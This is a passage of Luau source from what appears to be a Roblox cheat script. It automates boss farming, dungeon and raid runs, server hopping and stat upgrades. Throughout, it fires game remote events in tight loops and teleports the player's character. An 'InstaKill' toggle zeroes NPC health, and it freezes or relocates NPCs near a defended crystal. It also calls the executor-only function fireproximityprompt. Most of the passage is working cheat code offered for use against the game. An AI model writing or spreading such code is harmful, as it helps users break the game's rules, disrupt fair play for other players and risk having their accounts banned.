                Title = 'Cosmic Found!',
                Description = 'Cosmic Boss spotted! Starting kill...',
                Duration = 4,
            })

            Toggles.AutoHopCosmicBoss.Value = false

            if Toggles.AutoCosmicBoss then
                Toggles.AutoCosmicBoss.Value = true

                Thread('CosmicBoss.AutoKill', SafeLoop('Auto Cosmic Boss', Func_AutoCosmicBoss), true)
            end

            break
        end
        if elapsed >= checkInterval then
            elapsed = 0
            hopAttempts = hopAttempts + 1

            if hopAttempts > MAX_HOP_ATTEMPTS then
                UI:Notify({
                    Title = 'Cosmic Hop',
                    Description = 'Max hops reached. Stopping.',
                    Duration = 5,
                })

                Toggles.AutoHopCosmicBoss.Value = false

                break
            end

            UI:Notify({
                Title = 'Cosmic Hop',
                Description = 'Hop #' .. hopAttempts,
                Duration = 2,
            })

            local hopped = false
            local retries = 0

            while not hopped and retries < 3 do
                retries = retries + 1

                pcall(function()
                    local Http = game:GetService('HttpService')
                    local TS = game:GetService('TeleportService')
                    local JobID = game.JobId
                    local candidates = {}
                    local nextCursor = nil

                    repeat
                        local url = 'https://games.roblox.com/v1/games/' .. TARGET_PLACE_ID .. '/servers/Public?sortOrder=Asc&limit=100'

                        if nextCursor and nextCursor ~= '' then
                            url = url .. '&cursor=' .. nextCursor
                        end

                        local ok, res = pcall(function()
                            return Http:JSONDecode(game:HttpGet(url))
                        end)

                        if not ok or not res or not res.data then
                            break
                        end

                        for _, server in pairs(res.data)do
                            if server.id ~= JobID and server.playing < server.maxPlayers and server.playing > 0 then
                                table.insert(candidates, server)
                            end
                        end

                        nextCursor = res.nextPageCursor
                    until not nextCursor or #candidates >= 20

                    if #candidates > 0 then
                        local pick = candidates[math.random(1, math.min(10, #candidates))]

                        TS:TeleportToPlaceInstance(TARGET_PLACE_ID, pick.id, Plr)

                        hopped = true
                    else
                        TS:Teleport(TARGET_PLACE_ID, Plr)

                        hopped = true
                    end
                end)

                if not hopped then
                    task.wait(2)
                end
            end

            if hopped then
                task.wait(10)
            end
        end
    end
end

local DioBossKeywords = {
    'TheWorldBoss_Normal',
    'TheWorldBoss_Medium',
    'TheWorldBoss_Hard',
    'TheWorldBoss_Extreme',
}
local DioDiffList = {
    'Normal',
    'Medium',
    'Hard',
    'Extreme',
}

function Func_AutoSpawnDio()
    while Toggles.AutoSpawnDio and Toggles.AutoSpawnDio.Value do
        task.wait(3)

        local boss = FindLiveBossAnywhere(DioBossKeywords)

        if not boss then
            local diff = Options.SelectedDioDiff or 'Normal'

            pcall(function()
                game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('RequestSpawnTheWorld'):FireServer(diff)
            end)
            task.wait(3)
        end
    end
end
function Func_AutoKillDio()
    while Toggles.AutoKillDio and Toggles.AutoKillDio.Value do
        task.wait(0.05)

        local boss = FindLiveBossAnywhere(DioBossKeywords)

        if boss and IsValidTarget(boss) then
            AttackTarget(boss, GetNearestIsland(boss:GetPivot().Position), 'Boss')
        else
            task.wait(0.5)
        end
    end
end
function TryEnterPortal()
    local char = GetCharacter()
    local root = char and char:FindFirstChild('HumanoidRootPart')

    if not root then
        return
    end

    local portalNames = {
        'ActiveDungeonPortal',
        'DungeonPortal',
        'BossRushPortal',
        'DungeonEntrance',
    }
    local portal = nil

    for _, name in ipairs(portalNames)do
        portal = workspace:FindFirstChild(name)

        if portal then
            break
        end
    end

    if not portal then
        for _, obj in pairs(workspace:GetDescendants())do
            if obj.Name:lower():find('portal') and obj:IsA('Model') then
                portal = obj

                break
            end
        end
    end
    if portal then
        local pCF = nil

        pcall(function()
            pCF = portal:GetPivot()
        end)

        if pCF then
            root.CFrame = pCF * CFrame.new(0, 2, 0)
            root.AssemblyLinearVelocity = Vector3.zero

            task.wait(0.3)
        end

        local prompt = portal:FindFirstChildOfClass('ProximityPrompt', true)

        if prompt and Support.Proximity then
            pcall(function()
                fireproximityprompt(prompt)
            end)
        end
    end
end
function GetAllNPCTargets()
    local targets = {}
    local myChar = LocalPlayer.Character
    local myRoot = myChar and myChar:FindFirstChild('HumanoidRootPart')

    if not myRoot then
        return targets
    end

    for _, obj in pairs(workspace:GetDescendants())do
        if obj:IsA('Model') then
            local hum = obj:FindFirstChildOfClass('Humanoid')
            local npcRoot = obj:FindFirstChild('HumanoidRootPart') or obj:FindFirstChild('Torso')

            if hum and npcRoot and hum.Health > 0 then
                local isPlayer = false

                for _, p in pairs(Players:GetPlayers())do
                    if p.Character == obj then
                        isPlayer = true

                        break
                    end
                end

                if obj == myChar then
                    isPlayer = true
                end
                if not isPlayer then
                    table.insert(targets, obj)
                end
            end
        end
    end

    return targets
end
function AttackAllTargets()
    local char = GetCharacter()
    local root = char and char:FindFirstChild('HumanoidRootPart')

    if not root then
        return false
    end

    local targets = GetAllNPCTargets()

    if #targets == 0 then
        return false
    end

    for _, npc in ipairs(targets)do
        local hum = npc:FindFirstChildOfClass('Humanoid')
        local npcRoot = npc:FindFirstChild('HumanoidRootPart')

        if not hum or not npcRoot or hum.Health <= 0 then
            continue
        end

        root.CFrame = npcRoot.CFrame * CFrame.new(0, 0, 3)
        root.AssemblyLinearVelocity = Vector3.zero

        EquipWeapon()

        if Toggles.InstaKill and Toggles.InstaKill.Value then
            pcall(function()
                hum.Health = 0
            end)
        end

        for i = 1, 5 do
            pcall(function()
                Remotes.M1:FireServer()
            end)

            Shared.LastM1 = time()

            task.wait(0.04)
        end

        FireSkillsWithPositionLock()
    end

    return true
end
function StartDungeonPortal(dungeonId, difficulty)
    pcall(function()
        Remotes.OpenDungeon:FireServer(tostring(dungeonId), tostring(difficulty))
    end)
    task.wait(1)
    pcall(function()
        game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('StartDungeonPortal'):FireServer()
    end)
    task.wait(0.5)
    pcall(function()
        Remotes.StartDungeon:FireServer()
    end)
    task.wait(0.5)
    pcall(function()
        game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('DungeonWaveVote'):FireServer(tostring(difficulty))
    end)
    task.wait(1)
    TryEnterPortal()
end
function Func_AutoDungeon()
    local function ReplayDungeon()
        pcall(function()
            game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('DungeonWaveReplayVote'):FireServer('sponsor')
        end)
        task.wait(1)
        pcall(function()
            Remotes.StartDungeon:FireServer()
        end)
        task.wait(3)
    end

    local dungeonId = Options.SelectedDungeonType or 'BossRush'
    local difficulty = Options.SelectedDungeonDiff or 'Easy'

    StartDungeonPortal(dungeonId, difficulty)

    while Toggles.AutoDungeon and Toggles.AutoDungeon.Value do
        task.wait(0.1)

        local char = GetCharacter()
        local hum = char and char:FindFirstChildOfClass('Humanoid')

        if not char or not hum or hum.Health <= 0 then
            task.wait(0.5)

            continue
        end

        local targets = GetAllNPCTargets()

        if #targets > 0 then
            AttackAllTargets()
        else
            if Toggles.AutoDungeonReplay and Toggles.AutoDungeonReplay.Value then
                ReplayDungeon()

                if #GetAllNPCTargets() == 0 then
                    StartDungeonPortal(dungeonId, difficulty)
                end
            else
                task.wait(1)
            end
        end
    end
end
function Func_AutoCrystalDefense()
    Shared.InDungeonMode = true

    local function StartCrystalRun()
        pcall(function()
            Remotes.OpenDungeon:FireServer('CrystalDefense', 'Normal')
        end)
        task.wait(1)
        pcall(function()
            Remotes.StartDungeon:FireServer()
        end)
        task.wait(2)
        TryEnterPortal()
    end

    StartCrystalRun()

    while Toggles.AutoCrystalDefense and Toggles.AutoCrystalDefense.Value do
        task.wait(0.05)

        local char = GetCharacter()
        local hum = char and char:FindFirstChildOfClass('Humanoid')

        if not char or not hum or hum.Health <= 0 then
            task.wait(0.5)

            continue
        end

        local hasTargets = AttackAllTargets()

        if not hasTargets then
            pcall(function()
                game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('DungeonWaveReplayVote'):FireServer('sponsor')
            end)
            task.wait(1)
            pcall(function()
                Remotes.StartDungeon:FireServer()
            end)
            task.wait(3)

            if #GetAllNPCTargets() == 0 then
                StartCrystalRun()
            end
        end
    end

    Shared.InDungeonMode = false
end
function Func_AutoProtectCrystal()
    local MobSpawnCache = {}
    local FrozenMobs = {}

    local function GetCrystalPos()
        for _, obj in pairs(workspace:GetDescendants())do
            if obj:GetAttribute('CrystalHP') or obj:GetAttribute('IsCrystal') then
                local pos = nil

                pcall(function()
                    pos = obj:GetPivot().Position
                end)

                if not pos then
                    local bp = obj:FindFirstChildOfClass('BasePart') or obj.PrimaryPart

                    if bp then
                        pos = bp.Position
                    end
                end
                if pos then
                    return pos
                end
            end
        end
        for _, obj in pairs(workspace:GetDescendants())do
            if obj.Name:lower():find('crystal') then
                local pos = nil

                pcall(function()
                    pos = obj:GetPivot().Position
                end)

                if not pos and obj:IsA('BasePart') then
                    pos = obj.Position
                end
                if pos then
                    return pos
                end
            end
        end

        return nil
    end
    local function GetAllMobs()
        local mobs = {}
        local folders = {
            PATH.Mobs,
            workspace:FindFirstChild('DungeonSpawns'),
            workspace:FindFirstChild('NPCs'),
        }

        for _, folder in pairs(folders)do
            if not folder then
                continue
            end

            for _, npc in pairs(folder:GetChildren())do
                if not npc:IsA('Model') then
                    continue
                end

                local hum = npc:FindFirstChildOfClass('Humanoid')
                local npcRoot = npc:FindFirstChild('HumanoidRootPart')

                if not hum or not npcRoot or hum.Health <= 0 then
                    continue
                end

                local isPlayer = false

                for _, p in pairs(Players:GetPlayers())do
                    if p.Character == npc then
                        isPlayer = true

                        break
                    end
                end

                if not isPlayer then
                    table.insert(mobs, npc)
                end
            end
        end

        return mobs
    end
    local function FreezeMob(npc, targetCF)
        if FrozenMobs[npc] then
            return
        end

        local npcRoot = npc:FindFirstChild('HumanoidRootPart')

        if not npcRoot then
            return
        end

        local hum = npc:FindFirstChildOfClass('Humanoid')

        if hum then
            pcall(function()
                hum.WalkSpeed = 0
            end)
            pcall(function()
                hum.PlatformStand = true
            end)
        end

        local bp = Instance.new('BodyPosition')

        bp.Name = 'CrystalProtectBP'
        bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bp.Position = targetCF.Position
        bp.D = 500
        bp.P = 100000
        bp.Parent = npcRoot

        local bg = Instance.new('BodyGyro')

        bg.Name = 'CrystalProtectBG'
        bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
        bg.CFrame = targetCF
        bg.D = 500
        bg.P = 100000
        bg.Parent = npcRoot
        FrozenMobs[npc] = {
            BP = bp,
            BG = bg,
            CF = targetCF,
        }
    end
    local function UnfreezeMob(npc)
        local data = FrozenMobs[npc]

        if not data then
            return
        end

        pcall(function()
            if data.BP and data.BP.Parent then
                data.BP:Destroy()
            end
            if data.BG and data.BG.Parent then
                data.BG:Destroy()
            end
        end)

        local hum = npc:FindFirstChildOfClass('Humanoid')

        if hum then
            pcall(function()
                hum.WalkSpeed = 16
            end)
            pcall(function()
                hum.PlatformStand = false
            end)
        end

        FrozenMobs[npc] = nil
    end

    for _, npc in pairs(GetAllMobs())do
        local npcRoot = npc:FindFirstChild('HumanoidRootPart')

        if npcRoot then
            MobSpawnCache[npc] = npcRoot.CFrame
        end
    end

    while Toggles.AutoProtectCrystal and Toggles.AutoProtectCrystal.Value do
        task.wait(0.05)

        local crystalPos = GetCrystalPos()

        if not crystalPos then
            task.wait(0.5)

            continue
        end

        local currentMobs = GetAllMobs()
        local currentMobSet = {}

        for _, npc in pairs(currentMobs)do
            currentMobSet[npc] = true

            local hum = npc:FindFirstChildOfClass('Humanoid')
            local npcRoot = npc:FindFirstChild('HumanoidRootPart')

            if not hum or not npcRoot or hum.Health <= 0 then
                UnfreezeMob(npc)

                MobSpawnCache[npc] = nil

                continue
            end
            if not MobSpawnCache[npc] then
                MobSpawnCache[npc] = npcRoot.CFrame
            end

            local distToCrystal = (npcRoot.Position - crystalPos).Magnitude

            if distToCrystal < 80 then
                local spawnCF = MobSpawnCache[npc]

                if spawnCF then
                    FreezeMob(npc, spawnCF)
                    pcall(function()
                        npcRoot.CFrame = spawnCF
                        npcRoot.AssemblyLinearVelocity = Vector3.zero
                        npcRoot.AssemblyAngularVelocity = Vector3.zero
                    end)
                end
            else
                if FrozenMobs[npc] then
                    UnfreezeMob(npc)
                end
            end
        end
        for npc in pairs(MobSpawnCache)do
            if not npc or not npc.Parent or not currentMobSet[npc] then
                UnfreezeMob(npc)

                MobSpawnCache[npc] = nil
            end
        end
    end

    for npc in pairs(FrozenMobs)do
        UnfreezeMob(npc)
    end

    MobSpawnCache = {}
    FrozenMobs = {}
end
function Func_ProtectCrystal_BringMobs()
    local function GetCrystalPos()
        for _, obj in pairs(workspace:GetDescendants())do
            if obj:GetAttribute('CrystalHP') or obj:GetAttribute('IsCrystal') then
                local pos = nil

                pcall(function()
                    pos = obj:GetPivot().Position
                end)

                if not pos then
                    local bp = obj:FindFirstChildOfClass('BasePart') or obj.PrimaryPart

                    if bp then
                        pos = bp.Position
                    end
                end
                if pos then
                    return pos
                end
            end
        end
        for _, obj in pairs(workspace:GetDescendants())do
            if obj.Name:lower():find('crystal') then
                local pos = nil

                pcall(function()
                    pos = obj:GetPivot().Position
                end)

                if not pos and obj:IsA('BasePart') then
                    pos = obj.Position
                end
                if pos then
                    return pos
                end
            end
        end

        return nil
    end
    local function GetAllDungeonMobs()
        local mobs = {}
        local folders = {
            PATH.Mobs,
            workspace:FindFirstChild('DungeonSpawns'),
            workspace:FindFirstChild('NPCs'),
        }

        for _, folder in pairs(folders)do
            if not folder then
                continue
            end

            for _, npc in pairs(folder:GetChildren())do
                if not npc:IsA('Model') then
                    continue
                end

                local hum = npc:FindFirstChildOfClass('Humanoid')
                local npcRoot = npc:FindFirstChild('HumanoidRootPart')

                if not hum or not npcRoot or hum.Health <= 0 then
                    continue
                end

                local isPlayer = false

                for _, p in pairs(Players:GetPlayers())do
                    if p.Character == npc then
                        isPlayer = true

                        break
                    end
                end

                if not isPlayer then
                    table.insert(mobs, npc)
                end
            end
        end

        return mobs
    end
    local function GetSpreadPosition(myPos, index, total)
        local angle = (math.pi * 2 / math.max(total, 1)) * (index - 1)
        local radius = 6 + (math.floor((index - 1) / 8) * 4)

        return Vector3.new(myPos.X + math.cos(angle) * radius, myPos.Y, myPos.Z + math.sin(angle) * radius)
    end

    while Toggles.ProtectCrystal_BringMobs and Toggles.ProtectCrystal_BringMobs.Value do
        task.wait(0.1)

        local crystalPos = GetCrystalPos()

        if not crystalPos then
            task.wait(0.5)

            continue
        end

        local char = GetCharacter()
        local root = char and char:FindFirstChild('HumanoidRootPart')

        if not root then
            task.wait(0.3)

            continue
        end

        local myPos = root.Position
        local mobs = GetAllDungeonMobs()
        local mobIdx = 0

        for _, npc in pairs(mobs)do
            local hum = npc:FindFirstChildOfClass('Humanoid')
            local npcRoot = npc:FindFirstChild('HumanoidRootPart')

            if not hum or not npcRoot or hum.Health <= 0 then
                continue
            end

            local distToCrystal = (npcRoot.Position - crystalPos).Magnitude

            if distToCrystal < 100 then
                mobIdx = mobIdx + 1

                local spreadPos = GetSpreadPosition(myPos, mobIdx, #mobs)

                pcall(function()
                    npcRoot.CFrame = CFrame.new(spreadPos)
                    npcRoot.AssemblyLinearVelocity = Vector3.zero
                end)
            end
        end
    end
end
function Func_ProtectCrystal_Repel()
    local REPEL_RADIUS = 80
    local REPEL_DISTANCE = 120

    local function GetCrystalPos()
        for _, obj in pairs(workspace:GetDescendants())do
            if obj:GetAttribute('CrystalHP') or obj:GetAttribute('IsCrystal') then
                local pos = nil

                pcall(function()
                    pos = obj:GetPivot().Position
                end)

                if not pos then
                    local bp = obj:FindFirstChildOfClass('BasePart') or obj.PrimaryPart

                    if bp then
                        pos = bp.Position
                    end
                end
                if pos then
                    return pos
                end
            end
        end
        for _, obj in pairs(workspace:GetDescendants())do
            if obj.Name:lower():find('crystal') then
                local pos = nil

                pcall(function()
                    pos = obj:GetPivot().Position
                end)

                if not pos and obj:IsA('BasePart') then
                    pos = obj.Position
                end
                if pos then
                    return pos
                end
            end
        end

        return nil
    end
    local function GetAllDungeonMobs()
        local mobs = {}
        local folders = {
            PATH.Mobs,
            workspace:FindFirstChild('DungeonSpawns'),
            workspace:FindFirstChild('NPCs'),
        }

        for _, folder in pairs(folders)do
            if not folder then
                continue
            end

            for _, npc in pairs(folder:GetChildren())do
                if not npc:IsA('Model') then
                    continue
                end

                local hum = npc:FindFirstChildOfClass('Humanoid')
                local npcRoot = npc:FindFirstChild('HumanoidRootPart')

                if not hum or not npcRoot or hum.Health <= 0 then
                    continue
                end

                local isPlayer = false

                for _, p in pairs(Players:GetPlayers())do
                    if p.Character == npc then
                        isPlayer = true

                        break
                    end
                end

                if not isPlayer then
                    table.insert(mobs, npc)
                end
            end
        end

        return mobs
    end

    while Toggles.ProtectCrystal_Repel and Toggles.ProtectCrystal_Repel.Value do
        task.wait(0.1)

        local crystalPos = GetCrystalPos()

        if not crystalPos then
            task.wait(0.5)

            continue
        end

        for _, npc in pairs(GetAllDungeonMobs())do
            local hum = npc:FindFirstChildOfClass('Humanoid')
            local npcRoot = npc:FindFirstChild('HumanoidRootPart')

            if not hum or not npcRoot or hum.Health <= 0 then
                continue
            end

            local mobPos = npcRoot.Position
            local distToCrystal = (mobPos - crystalPos).Magnitude

            if distToCrystal < REPEL_RADIUS then
                local pushDir = (mobPos - crystalPos)

                if pushDir.Magnitude < 0.1 then
                    pushDir = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
                end

                pushDir = pushDir.Unit

                local pushPos = crystalPos + pushDir * REPEL_DISTANCE

                pushPos = Vector3.new(pushPos.X, mobPos.Y, pushPos.Z)

                pcall(function()
                    npcRoot.CFrame = CFrame.new(pushPos)
                    npcRoot.AssemblyLinearVelocity = Vector3.zero
                    npcRoot.AssemblyAngularVelocity = Vector3.zero
                end)
            end
        end
    end
end

local UpgradeRemotes = {
    InfiniteTower = GetRemote(RS, 'Remotes.RequestInfiniteTowerUpgrade'),
    BossRush = GetRemote(RS, 'Remotes.RequestBossRushUpgrade'),
    CrystalDefense = GetRemote(RS, 'Remotes.RequestCrystalDefenseUpgrade'),
    Easter = GetRemote(RS, 'Remotes.RequestEasterUpgrade'),
}
local UpgradeStatArgs = {
    InfiniteTower = {
        'Damage',
        'CritDamage',
        'CritChance',
        'HP',
        'Luck',
    },
    BossRush = {
        'Damage',
        'CritDamage',
        'CritChance',
        'HP',
        'Luck',
    },
    CrystalDefense = {
        'Damage',
        'CritDamage',
        'CritChance',
        'HP',
        'Luck',
    },
    Easter = {
        'EggDropChance',
        'EggChance',
        'EasterBossLuck',
    },
}

function Func_AutoTowerUpgrade()
    while Toggles.AutoTowerUpgrade and Toggles.AutoTowerUpgrade.Value do
        local selected = Options.SelectedTowerStats or {}
        local remote = UpgradeRemotes.InfiniteTower

        if not remote then
            task.wait(1)

            continue
        end

        local upgraded = false

        for _, stat in ipairs(UpgradeStatArgs.InfiniteTower)do
            if not (Toggles.AutoTowerUpgrade and Toggles.AutoTowerUpgrade.Value) then
                break
            end
            if selected[stat] then
                local ok, err = pcall(function()
                    remote:InvokeServer(stat)
                end)

                if not ok then
                    pcall(function()
                        remote:InvokeServer(stat:upper())
                    end)
                    pcall(function()
                        remote:InvokeServer(stat:lower())
                    end)
                end

                upgraded = true

                task.wait(Options.UpgradeCD or 0.5)
            end
        end

        if not upgraded then
            task.wait(1)
        end

        task.wait(Options.UpgradeCD or 0.5)
    end
end
function Func_AutoBossRushUpgrade()
    while Toggles.AutoBossRushUpgrade and Toggles.AutoBossRushUpgrade.Value do
        local selected = Options.SelectedBossRushStats or {}
        local remote = UpgradeRemotes.BossRush

        if not remote then
            task.wait(1)

            continue
        end

        local upgraded = false

        for _, stat in ipairs(UpgradeStatArgs.BossRush)do
            if not (Toggles.AutoBossRushUpgrade and Toggles.AutoBossRushUpgrade.Value) then
                break
            end
            if selected[stat] then
                local ok = pcall(function()
                    remote:InvokeServer(stat)
                end)

                if not ok then
                    pcall(function()
                        remote:InvokeServer(stat:upper())
                    end)
                end

                upgraded = true

                task.wait(Options.UpgradeCD or 0.5)
            end
        end

        if not upgraded then
            task.wait(1)
        end

        task.wait(Options.UpgradeCD or 0.5)
    end
end
function Func_AutoCrystalDefenseUpgrade()
    while Toggles.AutoCrystalDefenseUpgrade and Toggles.AutoCrystalDefenseUpgrade.Value do
        local selected = Options.SelectedCrystalStats or {}
        local remote = UpgradeRemotes.CrystalDefense

        if not remote then
            task.wait(1)

            continue
        end

        local upgraded = false

        for _, stat in ipairs(UpgradeStatArgs.CrystalDefense)do
            if not (Toggles.AutoCrystalDefenseUpgrade and Toggles.AutoCrystalDefenseUpgrade.Value) then
                break
            end
            if selected[stat] then
                local ok = pcall(function()
                    remote:InvokeServer(stat)
                end)

                if not ok then
                    pcall(function()
                        remote:InvokeServer(stat:upper())
                    end)
                end

                upgraded = true

                task.wait(Options.UpgradeCD or 0.5)
            end
        end

        if not upgraded then
            task.wait(1)
        end

        task.wait(Options.UpgradeCD or 0.5)
    end
end
function Func_AutoEasterUpgrade()
    while Toggles.AutoEasterUpgrade and Toggles.AutoEasterUpgrade.Value do
        local selected = Options.SelectedEasterStats or {}
        local remote = UpgradeRemotes.Easter

        if not remote then
            task.wait(1)

            continue
        end

        local easterStats = {
            EggDropChance = {
                'EggDropChance',
                'EGG_DROP_CHANCE',
                'eggDropChance',
            },
            EggChance = {
                'EggChance',
                'EGG_CHANCE',
                'eggChance',
                'ExtraEgg',
            },
            EasterBossLuck = {
                'EasterBossLuck',
                'EASTER_BOSS_LUCK',
                'easterBossLuck',
                'BossLuck',
            },
        }
        local upgraded = false

        for displayName, variants in pairs(easterStats)do
            if not (Toggles.AutoEasterUpgrade and Toggles.AutoEasterUpgrade.Value) then
                break
            end
            if selected[displayName] then
                local success = false

                for _, variantName in ipairs(variants)do
                    local ok = pcall(function()
                        remote:InvokeServer(variantName)
                    end)

                    if ok then
                        success = true

                        break
                    end
                end

                upgraded = true

                task.wait(Options.UpgradeCD or 0.5)
            end
        end

        if not upgraded then
            task.wait(1)
        end

        task.wait(Options.UpgradeCD or 0.5)
    end
end
function SyncSpecPassiveAutoSkip_ZH()
    pcall(function()
        if Remotes.SpecPassiveSkip then
            Remotes.SpecPassiveSkip:FireServer({
                Epic = true,
                Legendary = true,
                Mythical = true,
            })
        end
    end)
end

local SunGodBossKeywords = {
    'SunGodBoss_Normal',
    'SunGodBoss_Medium',
    'SunGodBoss_Hard',
    'SunGodBoss_Extreme',
}

function FindLiveSunGodBoss()
    return FindLiveBossAnywhere(SunGodBossKeywords)
end
function Func_AutoSunGodBoss()
    while Toggles.AutoSunGodBoss and Toggles.AutoSunGodBoss.Value do
        task.wait(0.05)

        local boss = FindLiveSunGodBoss()

        if not boss then
            Shared.SunGodBossFound = false

            task.wait(0.5)

            continue
        end

        Shared.SunGodBossFound = true
        Shared.Target = boss
        Shared.TargetValid = true

        if not MoveAbove(boss, 150) then
            task.wait(0.3)

            continue
        end

        EquipWeapon()

        local bossHP = boss:GetAttribute('_BossHP') or boss:GetAttribute('BossHP')
        local hum = boss:FindFirstChildOfClass('Humanoid')
        local alive = (bossHP and tonumber(bossHP) and tonumber(bossHP) > 0) or (hum and hum.Health > 0)

        if not alive then
            Shared.SunGodBossFound = false

            continue
        end

        TryInstaKill(boss)
        BurstM1OnTarget(boss, 5, 0.04)
        FireSkillsWithPositionLock()
        UpdateSwitchState(boss, 'Boss')
    end

    Shared.SunGodBossFound = false
end
function Func_AutoHopUntilSunGodBoss()
    local TARGET_PLACE_ID = 77747658251236
    local checkInterval = 3
    local elapsed = 0
    local hopAttempts = 0
    local MAX_HOP_ATTEMPTS = 15

    local function IsSunGodAliveNow()
        return FindLiveSunGodBoss() ~= nil
    end

    if IsSunGodAliveNow() then
        fnl:MakeNotification({
            Title = 'Sun God Hop',
            Description = 'Sun God Boss already here!',
            Duration = 3,
        })

        Toggles.AutoHopSunGodBoss.Value = false

        if Toggles.AutoSunGodBoss then
            Toggles.AutoSunGodBoss.Value = true

            Thread('SunGodBoss.AutoKill', SafeLoop('Auto Sun God Boss', Func_AutoSunGodBoss), true)
        end

        return
    end

    fnl:MakeNotification({
        Title = 'Sun God Hop',
        Description = 'Searching servers for Sun God Boss...',
        Duration = 3,
    })

    while Toggles.AutoHopSunGodBoss and Toggles.AutoHopSunGodBoss.Value do
        task.wait(1)

        elapsed = elapsed + 1

        if IsSunGodAliveNow() then
            fnl:MakeNotification({
                Title = 'Sun God Found!',
                Description = 'Sun God Boss spotted! Starting kill...',
                Duration = 4,
            })

            Toggles.AutoHopSunGodBoss.Value = false

            if Toggles.AutoSunGodBoss then
                Toggles.AutoSunGodBoss.Value = true

                Thread('SunGodBoss.AutoKill', SafeLoop('Auto Sun God Boss', Func_AutoSunGodBoss), true)
            end

            break
        end
        if elapsed >= checkInterval then
            elapsed = 0
            hopAttempts = hopAttempts + 1

            if hopAttempts > MAX_HOP_ATTEMPTS then
                fnl:MakeNotification({
                    Title = 'Sun God Hop',
                    Description = 'Max hops reached. Stopping.',
                    Duration = 5,
                })

                Toggles.AutoHopSunGodBoss.Value = false

                break
            end

            fnl:MakeNotification({
                Title = 'Sun God Hop',
                Description = 'Hop #' .. hopAttempts,
                Duration = 2,
            })

            local hopped = false
            local retries = 0

            while not hopped and retries < 3 do
                retries = retries + 1

                pcall(function()
                    local Http = game:GetService('HttpService')
                    local TS = game:GetService('TeleportService')
                    local JobID = game.JobId
                    local candidates = {}
                    local nextCursor = nil

                    repeat
                        local url = 'https://games.roblox.com/v1/games/' .. TARGET_PLACE_ID .. '/servers/Public?sortOrder=Asc&limit=100'

                        if nextCursor and nextCursor ~= '' then
                            url = url .. '&cursor=' .. nextCursor
                        end

                        local ok, res = pcall(function()
                            return Http:JSONDecode(game:HttpGet(url))
                        end)

                        if not ok or not res or not res.data then
                            break
                        end

                        for _, server in pairs(res.data)do
                            if server.id ~= JobID and server.playing < server.maxPlayers and server.playing > 0 then
                                table.insert(candidates, server)
                            end
                        end

                        nextCursor = res.nextPageCursor
                    until not nextCursor or #candidates >= 20

                    if #candidates > 0 then
                        local pick = candidates[math.random(1, math.min(10, #candidates))]

                        TS:TeleportToPlaceInstance(TARGET_PLACE_ID, pick.id, Plr)

                        hopped = true
                    else
                        TS:Teleport(TARGET_PLACE_ID, Plr)

                        hopped = true
                    end
                end)

                if not hopped then
                    task.wait(2)
                end
            end

            if hopped then
                task.wait(10)
            end
        end
    end
end

local MinotaurDiffList = {
    'Easy',
    'Medium',
    'Hard',
    'Extreme',
}

function FindMinoBoss()
    local npcs = workspace:FindFirstChild('NPCs')

    if not npcs then
        return nil
    end

    local boss = npcs:FindFirstChild('MinoBoss')

    if not boss then
        return nil
    end

    local bossHP = boss:GetAttribute('_BossHP') or boss:GetAttribute('BossHP')

    if bossHP and tonumber(bossHP) and tonumber(bossHP) > 0 then
        return boss
    end

    local hum = boss:FindFirstChildOfClass('Humanoid')

    if hum and hum.Health > 0 then
        return boss
    end

    return nil
end
function AttackMinoBoss(boss)
    if not boss or not boss.Parent then
        return false
    end

    local hum = boss:FindFirstChildOfClass('Humanoid')
    local bossHP = boss:GetAttribute('_BossHP') or boss:GetAttribute('BossHP')
    local alive = (hum and hum.Health > 0) or (bossHP and tonumber(bossHP) and tonumber(bossHP) > 0)

    if not alive then
        return false
    end

    local char = GetCharacter()
    local root = char and char:FindFirstChild('HumanoidRootPart')

    if not char or not root then
        return false
    end

    Shared.Target = boss
    Shared.TargetValid = true

    local bossRoot = boss:FindFirstChild('HumanoidRootPart') or boss:FindFirstChildOfClass('BasePart')

    if bossRoot then
        local dest = CFrame.lookAt(bossRoot.Position + Vector3.new(0, 0, Options.Distance or 5), bossRoot.Position)
        local dist = (root.Position - bossRoot.Position).Magnitude
        local movementType = Options.SelectedMovementType or 'Teleport'

        if movementType == 'Teleport' then
            if dist > 3 then
                root.CFrame = dest
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
            end
        else
            if dist > 3 then
                local speed = Options.TweenSpeed or 160
                local duration = math.clamp(dist / speed, 0.05, 0.4)
                local tw = TweenService:Create(root, TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {CFrame = dest})

                tw:Play()
            end

            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end
    end

    EquipWeapon()

    if Toggles.InstaKill and Toggles.InstaKill.Value then
        if hum then
            pcall(function()
                hum.Health = 0
            end)
        end
    end

    for i = 1, 5 do
        local h2 = boss:FindFirstChildOfClass('Humanoid')
        local hp2 = boss:GetAttribute('_BossHP') or boss:GetAttribute('BossHP')
        local stillAlive = (h2 and h2.Health > 0) or (hp2 and tonumber(hp2) and tonumber(hp2) > 0)

        if not stillAlive then
            break
        end

        pcall(function()
            Remotes.M1:FireServer()
        end)

        Shared.LastM1 = time()

        task.wait(0.04)
    end

    FireSkillsWithPositionLock()
    UpdateSwitchState(boss, 'Boss')

    return true
end
function StartMinotaurRaid(difficulty)
    difficulty = difficulty or Options.SelectedMinotaurDiff or 'Easy'

    pcall(function()
        game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('OpenRaidUI'):FireServer(difficulty)
    end)
    task.wait(1)
    pcall(function()
        game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('RequestDungeonPortal'):FireServer('Raid')
    end)
    task.wait(1)
    pcall(function()
        game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('DungeonWaveVote'):FireServer(difficulty)
    end)
    task.wait(0.5)
    pcall(function()
        game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('DungeonWaveVote'):FireServer('start')
    end)
    task.wait(1)
    pcall(function()
        Remotes.StartDungeon:FireServer()
    end)
